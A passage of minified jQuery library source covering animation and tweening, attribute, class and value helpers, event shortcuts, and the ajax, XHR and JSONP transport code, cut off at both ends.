d,e,f={},g=0;if(n.isArray(b)){for(d=wb(a),e=b.length;e>g;g++)f[b[g]]=n.css(a,b[g],!1,d);return f}return void 0!==c?n.style(a,b,c):n.css(a,b)},a,b,arguments.length>1)},show:function(){return Jb(this,!0)},hide:function(){return Jb(this)},toggle:function(a){return"boolean"==typeof a?a?this.show():this.hide():this.each(function(){S(this)?n(this).show():n(this).hide()})}});function Kb(a,b,c,d,e){return new Kb.prototype.init(a,b,c,d,e)}n.Tween=Kb,Kb.prototype={constructor:Kb,init:function(a,b,c,d,e,f){this.elem=a,this.prop=c,this.easing=e||"swing",this.options=b,this.start=this.now=this.cur(),this.end=d,this.unit=f||(n.cssNumber[c]?"":"px")},cur:function(){var a=Kb.propHooks[this.prop];return a&&a.get?a.get(this):Kb.propHooks._default.get(this)},run:function(a){var b,c=Kb.propHooks[this.prop];return this.pos=b=this.options.duration?n.easing[this.easing](a,this.options.duration*a,0,1,this.options.duration):a,this.now=(this.end-this.start)*b+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),c&&c.set?c.set(this):Kb.propHooks._default.set(this),this}},Kb.prototype.init.prototype=Kb.prototype,Kb.propHooks={_default:{get:function(a){var b;return null==a.elem[a.prop]||a.elem.style&&null!=a.elem.style[a.prop]?(b=n.css(a.elem,a.prop,""),b&&"auto"!==b?b:0):a.elem[a.prop]},set:function(a){n.fx.step[a.prop]?n.fx.step[a.prop](a):a.elem.style&&(null!=a.elem.style[n.cssProps[a.prop]]||n.cssHooks[a.prop])?n.style(a.elem,a.prop,a.now+a.unit):a.elem[a.prop]=a.now}}},Kb.propHooks.scrollTop=Kb.propHooks.scrollLeft={set:function(a){a.elem.nodeType&&a.elem.parentNode&&(a.elem[a.prop]=a.now)}},n.easing={linear:function(a){return a},swing:function(a){return.5-Math.cos(a*Math.PI)/2}},n.fx=Kb.prototype.init,n.fx.step={};var Lb,Mb,Nb=/^(?:toggle|show|hide)$/,Ob=new RegExp("^(?:([+-])=|)("+Q+")([a-z%]*)$","i"),Pb=/queueHooks$/,Qb=[Vb],Rb={"*":[function(a,b){var c=this.createTween(a,b),d=c.cur(),e=Ob.exec(b),f=e&&e[3]||(n.cssNumber[a]?"":"px"),g=(n.cssNumber[a]||"px"!==f&&+d)&&Ob.exec(n.css(c.elem,a)),h=1,i=20;if(g&&g[3]!==f){f=f||g[3],e=e||[],g=+d||1;do h=h||".5",g/=h,n.style(c.elem,a,g+f);while(h!==(h=c.cur()/d)&&1!==h&&--i)}return e&&(g=c.start=+g||+d||0,c.unit=f,c.end=e[1]?g+(e[1]+1)*e[2]:+e[2]),c}]};function Sb(){return setTimeout(function(){Lb=void 0}),Lb=n.now()}function Tb(a,b){var c,d=0,e={height:a};for(b=b?1:0;4>d;d+=2-b)c=R[d],e["margin"+c]=e["padding"+c]=a;return b&&(e.opacity=e.width=a),e}function Ub(a,b,c){for(var d,e=(Rb[b]||[]).concat(Rb["*"]),f=0,g=e.length;g>f;f++)if(d=e[f].call(c,b,a))return d}function Vb(a,b,c){var d,e,f,g,h,i,j,k,l=this,m={},o=a.style,p=a.nodeType&&S(a),q=L.get(a,"fxshow");c.queue||(h=n._queueHooks(a,"fx"),null==h.unqueued&&(h.unqueued=0,i=h.empty.fire,h.empty.fire=function(){h.unqueued||i()}),h.unqueued++,l.always(function(){l.always(function(){h.unqueued--,n.queue(a,"fx").length||h.empty.fire()})})),1===a.nodeType&&("height"in b||"width"in b)&&(c.overflow=[o.overflow,o.overflowX,o.overflowY],j=n.css(a,"display"),k="none"===j?L.get(a,"olddisplay")||tb(a.nodeName):j,"inline"===k&&"none"===n.css(a,"float")&&(o.display="inline-block")),c.overflow&&(o.overflow="hidden",l.always(function(){o.overflow=c.overflow[0],o.overflowX=c.overflow[1],o.overflowY=c.overflow[2]}));for(d in b)if(e=b[d],Nb.exec(e)){if(delete b[d],f=f||"toggle"===e,e===(p?"hide":"show")){if("show"!==e||!q||void 0===q[d])continue;p=!0}m[d]=q&&q[d]||n.style(a,d)}else j=void 0;if(n.isEmptyObject(m))"inline"===("none"===j?tb(a.nodeName):j)&&(o.display=j);else{q?"hidden"in q&&(p=q.hidden):q=L.access(a,"fxshow",{}),f&&(q.hidden=!p),p?n(a).show():l.done(function(){n(a).hide()}),l.done(function(){var b;L.remove(a,"fxshow");for(b in m)n.style(a,b,m[b])});for(d in m)g=Ub(p?q[d]:0,d,l),d in q||(q[d]=g.start,p&&(g.end=g.start,g.start="width"===d||"height"===d?1:0))}}function Wb(a,b){var c,d,e,f,g;for(c in a)if(d=n.camelCase(c),e=b[d],f=a[c],n.isArray(f)&&(e=f[1],f=a[c]=f[0]),c!==d&&(a[d]=f,delete a[c]),g=n.cssHooks[d],g&&"expand"in g){f=g.expand(f),delete a[d];for(c in f)c in a||(a[c]=f[c],b[c]=e)}else b[d]=e}function Xb(a,b,c){var d,e,f=0,g=Qb.length,h=n.Deferred().always(function(){delete i.elem}),i=function(){if(e)return!1;for(var b=Lb||Sb(),c=Math.max(0,j.startTime+j.duration-b),d=c/j.duration||0,f=1-d,g=0,i=j.tweens.length;i>g;g++)j.tweens[g].run(f);return h.notifyWith(a,[j,f,c]),1>f&&i?c:(h.resolveWith(a,[j]),!1)},j=h.promise({elem:a,props:n.extend({},b),opts:n.extend(!0,{specialEasing:{}},c),originalProperties:b,originalOptions:c,startTime:Lb||Sb(),duration:c.duration,tweens:[],createTween:function(b,c){var d=n.Tween(a,j.opts,b,c,j.opts.specialEasing[b]||j.opts.easing);return j.tweens.push(d),d},stop:function(b){var c=0,d=b?j.tweens.length:0;if(e)return this;for(e=!0;d>c;c++)j.tweens[c].run(1);return b?h.resolveWith(a,[j,b]):h.rejectWith(a,[j,b]),this}}),k=j.props;for(Wb(k,j.opts.specialEasing);g>f;f++)if(d=Qb[f].call(j,a,k,j.opts))return d;return n.map(k,Ub,j),n.isFunction(j.opts.start)&&j.opts.start.call(a,j),n.fx.timer(n.extend(i,{elem:a,anim:j,queue:j.opts.queue})),j.progress(j.opts.progress).done(j.opts.done,j.opts.complete).fail(j.opts.fail).always(j.opts.always)}n.Animation=n.extend(Xb,{tweener:function(a,b){n.isFunction(a)?(b=a,a=["*"]):a=a.split(" ");for(var c,d=0,e=a.length;e>d;d++)c=a[d],Rb[c]=Rb[c]||[],Rb[c].unshift(b)},prefilter:function(a,b){b?Qb.unshift(a):Qb.push(a)}}),n.speed=function(a,b,c){var d=a&&"object"==typeof a?n.extend({},a):{complete:c||!c&&b||n.isFunction(a)&&a,duration:a,easing:c&&b||b&&!n.isFunction(b)&&b};return d.duration=n.fx.off?0:"number"==typeof d.duration?d.duration:d.duration in n.fx.speeds?n.fx.speeds[d.duration]:n.fx.speeds._default,(null==d.queue||d.queue===!0)&&(d.queue="fx"),d.old=d.complete,d.complete=function(){n.isFunction(d.old)&&d.old.call(this),d.queue&&n.dequeue(this,d.queue)},d},n.fn.extend({fadeTo:function(a,b,c,d){return this.filter(S).css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){var e=n.isEmptyObject(a),f=n.speed(b,c,d),g=function(){var b=Xb(this,n.extend({},a),f);(e||L.get(this,"finish"))&&b.stop(!0)};return g.finish=g,e||f.queue===!1?this.each(g):this.queue(f.queue,g)},stop:function(a,b,c){var d=function(a){var b=a.stop;delete a.stop,b(c)};return"string"!=typeof a&&(c=b,b=a,a=void 0),b&&a!==!1&&this.queue(a||"fx",[]),this.each(function(){var b=!0,e=null!=a&&a+"queueHooks",f=n.timers,g=L.get(this);if(e)g[e]&&g[e].stop&&d(g[e]);else for(e in g)g[e]&&g[e].stop&&Pb.test(e)&&d(g[e]);for(e=f.length;e--;)f[e].elem!==this||null!=a&&f[e].queue!==a||(f[e].anim.stop(c),b=!1,f.splice(e,1));(b||!c)&&n.dequeue(this,a)})},finish:function(a){return a!==!1&&(a=a||"fx"),this.each(function(){var b,c=L.get(this),d=c[a+"queue"],e=c[a+"queueHooks"],f=n.timers,g=d?d.length:0;for(c.finish=!0,n.queue(this,a,[]),e&&e.stop&&e.stop.call(this,!0),b=f.length;b--;)f[b].elem===this&&f[b].queue===a&&(f[b].anim.stop(!0),f.splice(b,1));for(b=0;g>b;b++)d[b]&&d[b].finish&&d[b].finish.call(this);delete c.finish})}}),n.each(["toggle","show","hide"],function(a,b){var c=n.fn[b];n.fn[b]=function(a,d,e){return null==a||"boolean"==typeof a?c.apply(this,arguments):this.animate(Tb(b,!0),a,d,e)}}),n.each({slideDown:Tb("show"),slideUp:Tb("hide"),slideToggle:Tb("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){n.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),n.timers=[],n.fx.tick=function(){var a,b=0,c=n.timers;for(Lb=n.now();b<c.length;b++)a=c[b],a()||c[b]!==a||c.splice(b--,1);c.length||n.fx.stop(),Lb=void 0},n.fx.timer=function(a){n.timers.push(a),a()?n.fx.start():n.timers.pop()},n.fx.interval=13,n.fx.start=function(){Mb||(Mb=setInterval(n.fx.tick,n.fx.interval))},n.fx.stop=function(){clearInterval(Mb),Mb=null},n.fx.speeds={slow:600,fast:200,_default:400},n.fn.delay=function(a,b){return a=n.fx?n.fx.speeds[a]||a:a,b=b||"fx",this.queue(b,function(b,c){var d=setTimeout(b,a);c.stop=function(){clearTimeout(d)}})},function(){var a=l.createElement("input"),b=l.createElement("select"),c=b.appendChild(l.createElement("option"));a.type="checkbox",k.checkOn=""!==a.value,k.optSelected=c.selected,b.disabled=!0,k.optDisabled=!c.disabled,a=l.createElement("input"),a.value="t",a.type="radio",k.radioValue="t"===a.value}();var Yb,Zb,$b=n.expr.attrHandle;n.fn.extend({attr:function(a,b){return J(this,n.attr,a,b,arguments.length>1)},removeAttr:function(a){return this.each(function(){n.removeAttr(this,a)})}}),n.extend({attr:function(a,b,c){var d,e,f=a.nodeType;if(a&&3!==f&&8!==f&&2!==f)return typeof a.getAttribute===U?n.prop(a,b,c):(1===f&&n.isXMLDoc(a)||(b=b.toLowerCase(),d=n.attrHooks[b]||(n.expr.match.bool.test(b)?Zb:Yb)),void 0===c?d&&"get"in d&&null!==(e=d.get(a,b))?e:(e=n.find.attr(a,b),null==e?void 0:e):null!==c?d&&"set"in d&&void 0!==(e=d.set(a,c,b))?e:(a.setAttribute(b,c+""),c):void n.removeAttr(a,b))
},removeAttr:function(a,b){var c,d,e=0,f=b&&b.match(E);if(f&&1===a.nodeType)while(c=f[e++])d=n.propFix[c]||c,n.expr.match.bool.test(c)&&(a[d]=!1),a.removeAttribute(c)},attrHooks:{type:{set:function(a,b){if(!k.radioValue&&"radio"===b&&n.nodeName(a,"input")){var c=a.value;return a.setAttribute("type",b),c&&(a.value=c),b}}}}}),Zb={set:function(a,b,c){return b===!1?n.removeAttr(a,c):a.setAttribute(c,c),c}},n.each(n.expr.match.bool.source.match(/\w+/g),function(a,b){var c=$b[b]||n.find.attr;$b[b]=function(a,b,d){var e,f;return d||(f=$b[b],$b[b]=e,e=null!=c(a,b,d)?b.toLowerCase():null,$b[b]=f),e}});var _b=/^(?:input|select|textarea|button)$/i;n.fn.extend({prop:function(a,b){return J(this,n.prop,a,b,arguments.length>1)},removeProp:function(a){return this.each(function(){delete this[n.propFix[a]||a]})}}),n.extend({propFix:{"for":"htmlFor","class":"className"},prop:function(a,b,c){var d,e,f,g=a.nodeType;if(a&&3!==g&&8!==g&&2!==g)return f=1!==g||!n.isXMLDoc(a),f&&(b=n.propFix[b]||b,e=n.propHooks[b]),void 0!==c?e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:a[b]=c:e&&"get"in e&&null!==(d=e.get(a,b))?d:a[b]},propHooks:{tabIndex:{get:function(a){return a.hasAttribute("tabindex")||_b.test(a.nodeName)||a.href?a.tabIndex:-1}}}}),k.optSelected||(n.propHooks.selected={get:function(a){var b=a.parentNode;return b&&b.parentNode&&b.parentNode.selectedIndex,null}}),n.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){n.propFix[this.toLowerCase()]=this});var ac=/[\t\r\n\f]/g;n.fn.extend({addClass:function(a){var b,c,d,e,f,g,h="string"==typeof a&&a,i=0,j=this.length;if(n.isFunction(a))return this.each(function(b){n(this).addClass(a.call(this,b,this.className))});if(h)for(b=(a||"").match(E)||[];j>i;i++)if(c=this[i],d=1===c.nodeType&&(c.className?(" "+c.className+" ").replace(ac," "):" ")){f=0;while(e=b[f++])d.indexOf(" "+e+" ")<0&&(d+=e+" ");g=n.trim(d),c.className!==g&&(c.className=g)}return this},removeClass:function(a){var b,c,d,e,f,g,h=0===arguments.length||"string"==typeof a&&a,i=0,j=this.length;if(n.isFunction(a))return this.each(function(b){n(this).removeClass(a.call(this,b,this.className))});if(h)for(b=(a||"").match(E)||[];j>i;i++)if(c=this[i],d=1===c.nodeType&&(c.className?(" "+c.className+" ").replace(ac," "):"")){f=0;while(e=b[f++])while(d.indexOf(" "+e+" ")>=0)d=d.replace(" "+e+" "," ");g=a?n.trim(d):"",c.className!==g&&(c.className=g)}return this},toggleClass:function(a,b){var c=typeof a;return"boolean"==typeof b&&"string"===c?b?this.addClass(a):this.removeClass(a):this.each(n.isFunction(a)?function(c){n(this).toggleClass(a.call(this,c,this.className,b),b)}:function(){if("string"===c){var b,d=0,e=n(this),f=a.match(E)||[];while(b=f[d++])e.hasClass(b)?e.removeClass(b):e.addClass(b)}else(c===U||"boolean"===c)&&(this.className&&L.set(this,"__className__",this.className),this.className=this.className||a===!1?"":L.get(this,"__className__")||"")})},hasClass:function(a){for(var b=" "+a+" ",c=0,d=this.length;d>c;c++)if(1===this[c].nodeType&&(" "+this[c].className+" ").replace(ac," ").indexOf(b)>=0)return!0;return!1}});var bc=/\r/g;n.fn.extend({val:function(a){var b,c,d,e=this[0];{if(arguments.length)return d=n.isFunction(a),this.each(function(c){var e;1===this.nodeType&&(e=d?a.call(this,c,n(this).val()):a,null==e?e="":"number"==typeof e?e+="":n.isArray(e)&&(e=n.map(e,function(a){return null==a?"":a+""})),b=n.valHooks[this.type]||n.valHooks[this.nodeName.toLowerCase()],b&&"set"in b&&void 0!==b.set(this,e,"value")||(this.value=e))});if(e)return b=n.valHooks[e.type]||n.valHooks[e.nodeName.toLowerCase()],b&&"get"in b&&void 0!==(c=b.get(e,"value"))?c:(c=e.value,"string"==typeof c?c.replace(bc,""):null==c?"":c)}}}),n.extend({valHooks:{option:{get:function(a){var b=n.find.attr(a,"value");return null!=b?b:n.trim(n.text(a))}},select:{get:function(a){for(var b,c,d=a.options,e=a.selectedIndex,f="select-one"===a.type||0>e,g=f?null:[],h=f?e+1:d.length,i=0>e?h:f?e:0;h>i;i++)if(c=d[i],!(!c.selected&&i!==e||(k.optDisabled?c.disabled:null!==c.getAttribute("disabled"))||c.parentNode.disabled&&n.nodeName(c.parentNode,"optgroup"))){if(b=n(c).val(),f)return b;g.push(b)}return g},set:function(a,b){var c,d,e=a.options,f=n.makeArray(b),g=e.length;while(g--)d=e[g],(d.selected=n.inArray(d.value,f)>=0)&&(c=!0);return c||(a.selectedIndex=-1),f}}}}),n.each(["radio","checkbox"],function(){n.valHooks[this]={set:function(a,b){return n.isArray(b)?a.checked=n.inArray(n(a).val(),b)>=0:void 0}},k.checkOn||(n.valHooks[this].get=function(a){return null===a.getAttribute("value")?"on":a.value})}),n.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){n.fn[b]=function(a,c){return arguments.length>0?this.on(b,null,a,c):this.trigger(b)}}),n.fn.extend({hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)},bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return 1===arguments.length?this.off(a,"**"):this.off(b,a||"**",c)}});var cc=n.now(),dc=/\?/;n.parseJSON=function(a){return JSON.parse(a+"")},n.parseXML=function(a){var b,c;if(!a||"string"!=typeof a)return null;try{c=new DOMParser,b=c.parseFromString(a,"text/xml")}catch(d){b=void 0}return(!b||b.getElementsByTagName("parsererror").length)&&n.error("Invalid XML: "+a),b};var ec=/#.*$/,fc=/([?&])_=[^&]*/,gc=/^(.*?):[ \t]*([^\r\n]*)$/gm,hc=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,ic=/^(?:GET|HEAD)$/,jc=/^\/\//,kc=/^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,lc={},mc={},nc="*/".concat("*"),oc=a.location.href,pc=kc.exec(oc.toLowerCase())||[];function qc(a){return function(b,c){"string"!=typeof b&&(c=b,b="*");var d,e=0,f=b.toLowerCase().match(E)||[];if(n.isFunction(c))while(d=f[e++])"+"===d[0]?(d=d.slice(1)||"*",(a[d]=a[d]||[]).unshift(c)):(a[d]=a[d]||[]).push(c)}}function rc(a,b,c,d){var e={},f=a===mc;function g(h){var i;return e[h]=!0,n.each(a[h]||[],function(a,h){var j=h(b,c,d);return"string"!=typeof j||f||e[j]?f?!(i=j):void 0:(b.dataTypes.unshift(j),g(j),!1)}),i}return g(b.dataTypes[0])||!e["*"]&&g("*")}function sc(a,b){var c,d,e=n.ajaxSettings.flatOptions||{};for(c in b)void 0!==b[c]&&((e[c]?a:d||(d={}))[c]=b[c]);return d&&n.extend(!0,a,d),a}function tc(a,b,c){var d,e,f,g,h=a.contents,i=a.dataTypes;while("*"===i[0])i.shift(),void 0===d&&(d=a.mimeType||b.getResponseHeader("Content-Type"));if(d)for(e in h)if(h[e]&&h[e].test(d)){i.unshift(e);break}if(i[0]in c)f=i[0];else{for(e in c){if(!i[0]||a.converters[e+" "+i[0]]){f=e;break}g||(g=e)}f=f||g}return f?(f!==i[0]&&i.unshift(f),c[f]):void 0}function uc(a,b,c,d){var e,f,g,h,i,j={},k=a.dataTypes.slice();if(k[1])for(g in a.converters)j[g.toLowerCase()]=a.converters[g];f=k.shift();while(f)if(a.responseFields[f]&&(c[a.responseFields[f]]=b),!i&&d&&a.dataFilter&&(b=a.dataFilter(b,a.dataType)),i=f,f=k.shift())if("*"===f)f=i;else if("*"!==i&&i!==f){if(g=j[i+" "+f]||j["* "+f],!g)for(e in j)if(h=e.split(" "),h[1]===f&&(g=j[i+" "+h[0]]||j["* "+h[0]])){g===!0?g=j[e]:j[e]!==!0&&(f=h[0],k.unshift(h[1]));break}if(g!==!0)if(g&&a["throws"])b=g(b);else try{b=g(b)}catch(l){return{state:"parsererror",error:g?l:"No conversion from "+i+" to "+f}}}return{state:"success",data:b}}n.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:oc,type:"GET",isLocal:hc.test(pc[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":nc,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":n.parseJSON,"text xml":n.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(a,b){return b?sc(sc(a,n.ajaxSettings),b):sc(n.ajaxSettings,a)},ajaxPrefilter:qc(lc),ajaxTransport:qc(mc),ajax:function(a,b){"object"==typeof a&&(b=a,a=void 0),b=b||{};var c,d,e,f,g,h,i,j,k=n.ajaxSetup({},b),l=k.context||k,m=k.context&&(l.nodeType||l.jquery)?n(l):n.event,o=n.Deferred(),p=n.Callbacks("once memory"),q=k.statusCode||{},r={},s={},t=0,u="canceled",v={readyState:0,getResponseHeader:function(a){var b;if(2===t){if(!f){f={};while(b=gc.exec(e))f[b[1].toLowerCase()]=b[2]}b=f[a.toLowerCase()]}return null==b?null:b},getAllResponseHeaders:function(){return 2===t?e:null},setRequestHeader:function(a,b){var c=a.toLowerCase();return t||(a=s[c]=s[c]||a,r[a]=b),this},overrideMimeType:function(a){return t||(k.mimeType=a),this},statusCode:function(a){var b;if(a)if(2>t)for(b in a)q[b]=[q[b],a[b]];else v.always(a[v.status]);return this},abort:function(a){var b=a||u;return c&&c.abort(b),x(0,b),this}};if(o.promise(v).complete=p.add,v.success=v.done,v.error=v.fail,k.url=((a||k.url||oc)+"").replace(ec,"").replace(jc,pc[1]+"//"),k.type=b.method||b.type||k.method||k.type,k.dataTypes=n.trim(k.dataType||"*").toLowerCase().match(E)||[""],null==k.crossDomain&&(h=kc.exec(k.url.toLowerCase()),k.crossDomain=!(!h||h[1]===pc[1]&&h[2]===pc[2]&&(h[3]||("http:"===h[1]?"80":"443"))===(pc[3]||("http:"===pc[1]?"80":"443")))),k.data&&k.processData&&"string"!=typeof k.data&&(k.data=n.param(k.data,k.traditional)),rc(lc,k,b,v),2===t)return v;i=n.event&&k.global,i&&0===n.active++&&n.event.trigger("ajaxStart"),k.type=k.type.toUpperCase(),k.hasContent=!ic.test(k.type),d=k.url,k.hasContent||(k.data&&(d=k.url+=(dc.test(d)?"&":"?")+k.data,delete k.data),k.cache===!1&&(k.url=fc.test(d)?d.replace(fc,"$1_="+cc++):d+(dc.test(d)?"&":"?")+"_="+cc++)),k.ifModified&&(n.lastModified[d]&&v.setRequestHeader("If-Modified-Since",n.lastModified[d]),n.etag[d]&&v.setRequestHeader("If-None-Match",n.etag[d])),(k.data&&k.hasContent&&k.contentType!==!1||b.contentType)&&v.setRequestHeader("Content-Type",k.contentType),v.setRequestHeader("Accept",k.dataTypes[0]&&k.accepts[k.dataTypes[0]]?k.accepts[k.dataTypes[0]]+("*"!==k.dataTypes[0]?", "+nc+"; q=0.01":""):k.accepts["*"]);for(j in k.headers)v.setRequestHeader(j,k.headers[j]);if(k.beforeSend&&(k.beforeSend.call(l,v,k)===!1||2===t))return v.abort();u="abort";for(j in{success:1,error:1,complete:1})v[j](k[j]);if(c=rc(mc,k,b,v)){v.readyState=1,i&&m.trigger("ajaxSend",[v,k]),k.async&&k.timeout>0&&(g=setTimeout(function(){v.abort("timeout")},k.timeout));try{t=1,c.send(r,x)}catch(w){if(!(2>t))throw w;x(-1,w)}}else x(-1,"No Transport");function x(a,b,f,h){var j,r,s,u,w,x=b;2!==t&&(t=2,g&&clearTimeout(g),c=void 0,e=h||"",v.readyState=a>0?4:0,j=a>=200&&300>a||304===a,f&&(u=tc(k,v,f)),u=uc(k,u,v,j),j?(k.ifModified&&(w=v.getResponseHeader("Last-Modified"),w&&(n.lastModified[d]=w),w=v.getResponseHeader("etag"),w&&(n.etag[d]=w)),204===a||"HEAD"===k.type?x="nocontent":304===a?x="notmodified":(x=u.state,r=u.data,s=u.error,j=!s)):(s=x,(a||!x)&&(x="error",0>a&&(a=0))),v.status=a,v.statusText=(b||x)+"",j?o.resolveWith(l,[r,x,v]):o.rejectWith(l,[v,x,s]),v.statusCode(q),q=void 0,i&&m.trigger(j?"ajaxSuccess":"ajaxError",[v,k,j?r:s]),p.fireWith(l,[v,x]),i&&(m.trigger("ajaxComplete",[v,k]),--n.active||n.event.trigger("ajaxStop")))}return v},getJSON:function(a,b,c){return n.get(a,b,c,"json")},getScript:function(a,b){return n.get(a,void 0,b,"script")}}),n.each(["get","post"],function(a,b){n[b]=function(a,c,d,e){return n.isFunction(c)&&(e=e||d,d=c,c=void 0),n.ajax({url:a,type:b,dataType:e,data:c,success:d})}}),n._evalUrl=function(a){return n.ajax({url:a,type:"GET",dataType:"script",async:!1,global:!1,"throws":!0})},n.fn.extend({wrapAll:function(a){var b;return n.isFunction(a)?this.each(function(b){n(this).wrapAll(a.call(this,b))}):(this[0]&&(b=n(a,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstElementChild)a=a.firstElementChild;return a}).append(this)),this)},wrapInner:function(a){return this.each(n.isFunction(a)?function(b){n(this).wrapInner(a.call(this,b))}:function(){var b=n(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=n.isFunction(a);return this.each(function(c){n(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){n.nodeName(this,"body")||n(this).replaceWith(this.childNodes)}).end()}}),n.expr.filters.hidden=function(a){return a.offsetWidth<=0&&a.offsetHeight<=0},n.expr.filters.visible=function(a){return!n.expr.filters.hidden(a)};var vc=/%20/g,wc=/\[\]$/,xc=/\r?\n/g,yc=/^(?:submit|button|image|reset|file)$/i,zc=/^(?:input|select|textarea|keygen)/i;function Ac(a,b,c,d){var e;if(n.isArray(b))n.each(b,function(b,e){c||wc.test(a)?d(a,e):Ac(a+"["+("object"==typeof e?b:"")+"]",e,c,d)});else if(c||"object"!==n.type(b))d(a,b);else for(e in b)Ac(a+"["+e+"]",b[e],c,d)}n.param=function(a,b){var c,d=[],e=function(a,b){b=n.isFunction(b)?b():null==b?"":b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};if(void 0===b&&(b=n.ajaxSettings&&n.ajaxSettings.traditional),n.isArray(a)||a.jquery&&!n.isPlainObject(a))n.each(a,function(){e(this.name,this.value)});else for(c in a)Ac(c,a[c],b,e);return d.join("&").replace(vc,"+")},n.fn.extend({serialize:function(){return n.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var a=n.prop(this,"elements");return a?n.makeArray(a):this}).filter(function(){var a=this.type;return this.name&&!n(this).is(":disabled")&&zc.test(this.nodeName)&&!yc.test(a)&&(this.checked||!T.test(a))}).map(function(a,b){var c=n(this).val();return null==c?null:n.isArray(c)?n.map(c,function(a){return{name:b.name,value:a.replace(xc,"\r\n")}}):{name:b.name,value:c.replace(xc,"\r\n")}}).get()}}),n.ajaxSettings.xhr=function(){try{return new XMLHttpRequest}catch(a){}};var Bc=0,Cc={},Dc={0:200,1223:204},Ec=n.ajaxSettings.xhr();a.attachEvent&&a.attachEvent("onunload",function(){for(var a in Cc)Cc[a]()}),k.cors=!!Ec&&"withCredentials"in Ec,k.ajax=Ec=!!Ec,n.ajaxTransport(function(a){var b;return k.cors||Ec&&!a.crossDomain?{send:function(c,d){var e,f=a.xhr(),g=++Bc;if(f.open(a.type,a.url,a.async,a.username,a.password),a.xhrFields)for(e in a.xhrFields)f[e]=a.xhrFields[e];a.mimeType&&f.overrideMimeType&&f.overrideMimeType(a.mimeType),a.crossDomain||c["X-Requested-With"]||(c["X-Requested-With"]="XMLHttpRequest");for(e in c)f.setRequestHeader(e,c[e]);b=function(a){return function(){b&&(delete Cc[g],b=f.onload=f.onerror=null,"abort"===a?f.abort():"error"===a?d(f.status,f.statusText):d(Dc[f.status]||f.status,f.statusText,"string"==typeof f.responseText?{text:f.responseText}:void 0,f.getAllResponseHeaders()))}},f.onload=b(),f.onerror=b("error"),b=Cc[g]=b("abort");try{f.send(a.hasContent&&a.data||null)}catch(h){if(b)throw h}},abort:function(){b&&b()}}:void 0}),n.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/(?:java|ecma)script/},converters:{"text script":function(a){return n.globalEval(a),a}}}),n.ajaxPrefilter("script",function(a){void 0===a.cache&&(a.cache=!1),a.crossDomain&&(a.type="GET")}),n.ajaxTransport("script",function(a){if(a.crossDomain){var b,c;return{send:function(d,e){b=n("<script>").prop({async:!0,charset:a.scriptCharset,src:a.url}).on("load error",c=function(a){b.remove(),c=null,a&&e("error"===a.type?404:200,a.type)}),l.head.appendChild(b[0])},abort:function(){c&&c()}}}});var Fc=[],Gc=/(=)\?(?=&|$)|\?\?/;n.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var a=Fc.pop()||n.expando+"_"+cc++;return this[a]=!0,a}}),n.ajaxPrefilter("json jsonp",function(b,c,d){var e,f,g,h=b.jsonp!==!1&&(Gc.test(b.url)?"url":"string"==typeof b.data&&!(b.contentType||"").indexOf("application/x-www-form-urlencoded")&&Gc.test(b.data)&&"data");return h||"jsonp"===b.dataTypes[0]?(e=b.jsonpCallback=n.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,h?b[h]=b[h].replace(Gc,"$1"+e):b.jsonp!==!1&&(b.url+=(dc.test(b.url)?"&":"?")+b.jsonp+"="+e),b.converters["script json"]=function(){return g||n.error(e+" was not called"),g[0]},b.dataTypes[0]="json",f=a[e],a[e]=function(){g=arguments},d.always(function(){a[e]=f,b[e]&&(b.jsonpCallback=c.jsonpCallback,Fc.push(e)),g&&n.isFunction(f)&&f(g[0]),g=f=void 0}),"script"):void 0}),n.parseHTML=function(a,b,c){if(!a||"string"!=typeof a)return null;"boolean"==typeof b&&(c=b,b=!1),b=b||l;var d=v.exec(a),e=!c&&[];return d?[b.createElement(d[1])]:(d=n.buildFragment([a],b,e),e&&e.length&&n(e).remove(),n.merge([],d.childNodes))};var Hc=n.fn.load;n.fn.load=function(a,b,c){if("string"!=typeof a&&Hc)return Hc.apply(this,arguments);var d,e,f,g=this,h=a.indexOf(" ");return h>=0&&(d=n.trim(a.slice(h)),a=a.slice(0,h)),n.isFunction(b)?(c=b,b=void 0):b&&"object"==typeof b&&(e="POST"),g.length>0&&n.ajax({url:a,type:e,dataType:"html",data:b}).done(function(a){f=arguments,g.html(d?n("<div>").append(n.parseHTML(a)).find(d):a)}).complete(c&&function(a,b){g.each(c,f||[a.responseText,b,a])}),this},n.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(a,b){n.fn[b]=function(a){return this.on(b,a)}}),n.expr.filters.animated=function(a){return n.grep(n.timers,function(b){return a===b.elem}).length};var 